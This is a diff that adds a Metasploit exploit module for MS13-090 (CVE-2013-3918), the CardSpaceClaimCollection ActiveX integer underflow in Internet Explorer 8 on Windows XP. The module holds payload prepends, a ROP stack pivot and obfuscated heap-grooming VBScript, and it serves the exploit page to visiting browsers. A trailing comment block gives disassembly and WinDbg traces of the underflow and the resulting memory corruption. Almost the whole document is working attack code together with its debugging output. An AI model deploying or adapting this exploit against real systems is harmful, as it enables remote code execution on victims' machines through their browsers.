@@ -1,0 +1,382 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "MS13-090 CardSpaceClaimCollection ActiveX Integer Underflow",
+      'Description'    => %q{
+        This module exploits a vulnerability on the CardSpaceClaimCollection class from the
+        icardie.dll ActiveX control. The vulnerability exists while the handling of the
+        CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of
+        elements on a SafeArray and keeps a size field, counting the number of elements on the
+        collection. By calling the remove() method on an empty CardSpaceClaimCollection it is
+        possible to underflow the length field, storing a negative integer. Later, a call to
+        the add() method will use the corrupted length field to compute the address where write
+        into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents.
+        This module achieves code execution by using VBScript as discovered in the wild on
+        November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create
+        a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt
+        one of the legit OBJECT elements with the described integer overflow and (5) achieve code
+        execution by forcing the use of the corrupted OBJECT.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Unknown',     # Vulnerability Discovery and exploit in the wild
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'CVE',   '2013-3918'],
+          [ 'OSVDB', '99555' ],
+          [ 'BID',   '63631' ],
+          [ 'MSB',   'MS13-090' ],
+          [ 'URL',   'http://blogs.technet.com/b/msrc/archive/2013/11/11/activex-control-issue-being-addressed-in-update-tuesday.aspx' ]
+        ],
+      'Payload'        =>
+        {
+          'Space'          => 4096,
+          'DisableNops'    => true,
+          'BadChars'       => "\x00",
+          # Patch the stack to execute the decoder...
+          'PrependEncoder' => "\x81\xc4\x0c\xfe\xff\xff", # add esp, -500
+          # Fix the stack again, this time better :), before the payload
+          # is executed.
+          'Prepend'        => "\x64\xa1\x18\x00\x00\x00" + # mov eax, fs:[0x18]
+                              "\x83\xC0\x08"             + # add eax, byte 8
+                              "\x8b\x20"                 + # mov esp, [eax]
+                              "\x81\xC4\x30\xF8\xFF\xFF",  # add esp, -2000
+        },
+      'Platform'       => 'win',
+      'BrowserRequirements' =>
+        {
+          :source  => /script|headers/i,
+          :clsid   => "{19916E01-B44E-4E31-94A4-4696DF46157B}",
+          :method  => "requiredClaims",
+          :os_name => Msf::OperatingSystems::WINDOWS
+        },
+      'Targets'        =>
+        [
+          [ 'Windows XP with IE 8',
+            {
+              'os_flavor' => Msf::OperatingSystems::WindowsVersions::XP,
+              'ua_name'   => Msf::HttpClients::IE,
+              'ua_ver'    => '8.0',
+              'arch'      => ARCH_X86
+            }
+          ]
+        ],
+      'DefaultOptions' =>
+        {
+          'InitialAutoRunScript' => 'migrate -f',
+          'Retries'              => false
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "Nov 08 2013",
+      'DefaultTarget'  => 0))
+
+  end
+
+  def exploit_template(cli, target_info)
+    stack_pivot = [
+      0x77c20433, # pop ebp, ret  # eax points here
+      0x77c15ed5  # xchg eax, esp # eip
+    ].pack("V*")
+
+    symbols = {
+      "CardSpaceSigninHelper" => rand_text_alpha(5 + rand(5)),
+      "get_code"              => rand_text_alpha(5 + rand(5)),
+      "code"                  => rand_text_alpha(5 + rand(5)),
+      "massage_array"         => rand_text_alpha(5 + rand(5)),
+      "required_claims"       => rand_text_alpha(5 + rand(5)),
+      "massage_array"         => rand_text_alpha(5 + rand(5)),
+      "massage_array_length"  => rand_text_alpha(5 + rand(5)),
+      "zero"                  => rand_text_alpha(5 + rand(5)),
+      "underflow"             => rand_text_alpha(5 + rand(5)),
+      "my_code"               => rand_text_alpha(5 + rand(5))
+    }
+
+    rop_payload = generate_rop_payload('msvcrt', get_payload(cli, target_info), {'target'=>'xp', 'pivot' => stack_pivot})
+    js_payload = Rex::Text.to_unescape(rop_payload)
+
+    html_template = %Q|
+    <html>
+    <head>
+    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+    <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
+    </head>
+    <body>
+    <object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='<%=symbols["CardSpaceSigninHelper"]%>'></object>
+    <script language='JavaScript'>
+
+    function <%=symbols["get_code"]%>(){
+      var <%=symbols["code"]%> = unescape("<%=js_payload%>");
+      return <%=symbols["code"]%>;
+    }
+    </script>
+    <script language='vbscript'>
+    On Error Resume Next
+    Dim <%=symbols["massage_array_length"]%>,<%=symbols["underflow"]%>,<%=symbols["zero"]%>
+    Dim <%=symbols["massage_array"]%>(5493)
+    <%=symbols["massage_array_length"]%> = 5493
+    <%=symbols["underflow"]%> = -7
+    <%=symbols["zero"]%> = 0
+
+    Set <%=symbols["required_claims"]%> = <%=symbols["CardSpaceSigninHelper"]%>.requiredClaims
+
+    For i = <%=symbols["zero"]%> to <%=symbols["massage_array_length"]%>
+      Set <%=symbols["massage_array"]%>(i) = document.createElement("object")
+    Next
+
+    For i = 4093 to <%=symbols["massage_array_length"]%> Step 2
+      <%=symbols["massage_array"]%>(i) = Null
+    Next
+
+    For i = <%=symbols["zero"]%> to <%=symbols["underflow"]%> Step -1
+      <%=symbols["required_claims"]%>.remove(CLng(i))
+    Next
+
+    Dim <%=symbols["my_code"]%>
+    <%=symbols["my_code"]%> = <%=symbols["get_code"]%>()
+    <%=symbols["required_claims"]%>.add(<%=symbols["my_code"]%>)
+
+    For i = <%=symbols["zero"]%> = 0 to <%=symbols["massage_array_length"]%>
+      if <%=symbols["massage_array"]%>(i) <> Null Then
+        <%=symbols["massage_array"]%>(i).focus
+      End If
+    Next
+
+    For i = <%=symbols["zero"]%> = 0 to <%=symbols["massage_array_length"]%>
+      <%=symbols["massage_array"]%>(i) = Null
+    Next
+
+    </script></body></html>
+    |
+
+    return html_template, binding()
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    print_status("Sending HTML...")
+    send_exploit_html(cli, exploit_template(cli, target_info))
+  end
+
+end
+
+=begin
+The CCardSpaceClaimCollection is abused. It is a 0x10 size object whose memory is allocated at:
+
+.text:0040A6E8                 and     dword ptr [edi], 0
+.text:0040A6EB                 push    ebx
+.text:0040A6EC                 push    esi
+.text:0040A6ED                 push    10h             ; unsigned int
+.text:0040A6EF                 mov     ebx, 8007000Eh
+.text:0040A6F4                 call    ??2@YAPAXI@Z    ; operator new(uint)
+
+The interesting fields:
+
+0x0 : vftable
+0x4 : unknown
+0x8 : number of elements on the collection (size)
+0xc : pointer to the CCardSpaceClaimCollection elements stored on a SafeArray
+(http://msdn.microsoft.com/en-us/library/windows/desktop/ms221482(v=vs.85).aspx)
+
+Both three fields are initialized to 0 / NULL when creating an instance of the object:
+
+.text:00409980 ; public: __thiscall CCardSpaceClaimCollection::CCardSpaceClaimCollection(void)
+.text:00409980                 xor     ecx, ecx
+.text:00409982                 mov     [eax+4], ecx
+.text:00409985                 mov     [eax+8], ecx
+.text:00409988                 mov     [eax+0Ch], ecx
+.text:0040998B                 retn
+
+(1) The first problem happens on CCardSpaceClaimCollection::remove, since it's possible to remove an element
+from a 0 length collection, underflowing the length field:
+
+.text:00409D46 loc_409D46:                             ; CODE XREF: CCardSpaceClaimCollection::remove(tagVARIANT *)+85j
+.text:00409D46                 dec     dword ptr [esi+8] ;  esi pointing to the CCardSpaceClaimCollection
+
+Debugging the underflow:
+
+0:017> bu icardie!CCardSpaceClaimCollection::remove+0xa0
+0:017> g
+ModLoad: 033b0000 033c2000   C:\WINDOWS\system32\icardie.dll
+ModLoad: 63380000 63434000   C:\WINDOWS\system32\jscript.dll
+ModLoad: 034e0000 0354a000   C:\WINDOWS\system32\vbscript.dll
+Breakpoint 0 hit
+eax=03672280 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=00000000
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=00000000
+0:008> g
+Breakpoint 0 hit
+eax=0367227c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=ffffffff
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=ffffffff
+0:008> g
+Breakpoint 0 hit
+eax=03672278 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffe
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=feffffff
+0:008> g
+Breakpoint 0 hit
+eax=03672274 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffd
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fdffffff
+0:008> g
+Breakpoint 0 hit
+eax=03672270 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffc
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fcffffff
+0:008> g
+Breakpoint 0 hit
+eax=0367226c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffb
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fbffffff
+0:008> g
+Breakpoint 0 hit
+eax=03672268 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffa
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=faffffff
+0:008> g
+Breakpoint 0 hit
+eax=03672264 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffff9
+eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+icardie!CCardSpaceClaimCollection::remove+0xa0:
+033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=f9ffffff
+0:008> g
+
+(2) The second problem happens on CCardSpaceClaimCollection::add
+
+First of all the SafeArray Container is get:
+
+.text:00409C0A                 mov     esi, [ebp+arg_0]
+.text:00409C0D                 call    ?GetInnerArray@CCardSpaceClaimCollection@@AAEPAUtagSAFEARRAY@@XZ ; C
+
+ and its capacity checked, so if needed it's going to be resized
+
+.text:00409C20 loc_409C20:                             ; CODE XREF: CCardSpaceClaimCollection::add(tagVARIANT *)+48j
+.text:00409C20                 mov     ebx, [esi+8]    ; The number of elements
+.text:00409C23                 inc     ebx             ; The number of elements incremented
+.text:00409C24                 call    ?GrowInnerArrayIfRequired@CCardSpaceClaimCollection@@AAEJJ@Z ;
+
+In order to check if the SafeArray needs to be resized GrowInnerArrayIfRequired checks
+the length of the CCardSpaceClaimCollection(underflowed) against the capacity of the SafeArray,
+since the comparision is signed, nothing is resized:
+
+0:008> g
+Breakpoint 4 hit
+eax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44
+eip=036a9e41 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x2e:
+036a9e41 3bda            cmp     ebx,edx
+0:008> r ebx, edx
+ebx=fffffff9 edx=0000000a
+
+Since the comparision is signed, nothing is resized:
+
+0:008> t
+eax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44
+eip=036a9e43 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei ng nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
+icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x30:
+036a9e43 7e1f            jle     icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x51 (036a9e64) [br=1]
+
+In order to proceed to modify the SafeArray, "add" saves a pointer to the data (ppvData) into a local variable:
+
+.text:00409C2F                 lea     eax, [ebp+ppvData]
+.text:00409C32                 push    eax             ; ppvData
+.text:00409C33                 push    [ebp+psa]       ; psa
+.text:00409C36                 call    ds:__imp__SafeArrayAccessData@8 ; SafeArrayAccessData(x,x)
+
+Then an String witht the user controlled contents is created, and a pointer to the contents is stored
+into the ppvData. Unfortunately, the underflowed length address is used to calculate where to store the
+thing:
+
+.text:00409C51                 push    dword ptr [edi+8] ; psz
+.text:00409C54                 call    ds:__imp__SysAllocString@4 ; SysAllocString(x)
+.text:00409C5A                 mov     ecx, [esi+8]
+.text:00409C5D                 mov     edx, [ebp+ppvData]
+.text:00409C60                 mov     [edx+ecx*4], eax ; edx pointer to ppvdata, ecx is the corrupted CCardSpaceClaimCollection length
+
+Finally the CCardSpaceClaimCollection size is incremented:
+.text:00409C63                 inc     dword ptr [esi+8]
+
+When debugging :
+
+0:008> t
+eax=001f5884 ebx=00000000 ecx=fffffff8 edx=00000028 esi=0035e6b8 edi=00242b44
+eip=036a9c5d esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+icardie!CCardSpaceClaimCollection::add+0x8e:
+036a9c5d 8b55f8          mov     edx,dword ptr [ebp-8] ss:0023:0201f3f0=10798a03
+0:008> t
+
+Here the underflow happens edx+ecx*4 points to 038a78f0, which is below 038a7910,
+where ppvData lives:
+
+eax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44
+eip=036a9c60 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+icardie!CCardSpaceClaimCollection::add+0x91:
+036a9c60 89048a          mov     dword ptr [edx+ecx*4],eax ds:0023:038a78f0=00000000
+0:008> t
+eax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44
+eip=036a9c63 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+icardie!CCardSpaceClaimCollection::add+0x94:
+036a9c63 ff4608          inc     dword ptr [esi+8]    ds:0023:0035e6c0=f8ffffff
+
+Later the overwritten object is used, its memory dereferenced and control of the execution flow is possible:
+
+0:008> g
+(b4c.b70): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=001f5884 ebx=00000000 ecx=038a78e0 edx=0201f5e4 esi=00000002 edi=036d150c
+eip=cccccccc esp=0201f5b4 ebp=0201f5c0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+cccccccc ??              ???
+0:008> dd ecx
+038a78e0  63ab1b18 00000002 6363fbe4 03894d38
+038a78f0  001f5884 00000000 00000000 00000000
+038a7900  00000000 00000000 00000000 00000000
+038a7910  00000000 00000000 00000000 00000000
+038a7920  00000000 00000000 00000000 00000000
+038a7930  00000000 00000000 e8319dff ff080100
+038a7940  63ab1b18 00000001 6363fbe4 03894f08
+038a7950  63767260 00000000 00000000 00020000
+0:008> db 001f5884
+001f5884  bb bb bb bb cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+001f5894  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+001f58a4  cc cc cc cc cc cc cc cc-00 00 00 00 e6 7e a1 ea  .............~..
+001f58b4  00 01 08 ff 70 18 5c 75-2c 18 5c 75 02 00 00 00  ....p.\u,.\u....
+001f58c4  e8 ac 9c 02 00 00 00 80-f3 1b 5d 75 b8 58 1f 00  ..........]u.X..
+001f58d4  48 00 9c 02 84 14 5c 75-e8 ac 9c 02 1b 00 00 00  H.....\u........
+001f58e4  e8 52 19 00 ed 7e a1 ea-00 01 08 ff 08 00 00 00  .R...~..........
+001f58f4  90 01 00 00 f0 00 00 00-00 00 00 00 01 00 00 00  ................
+=end
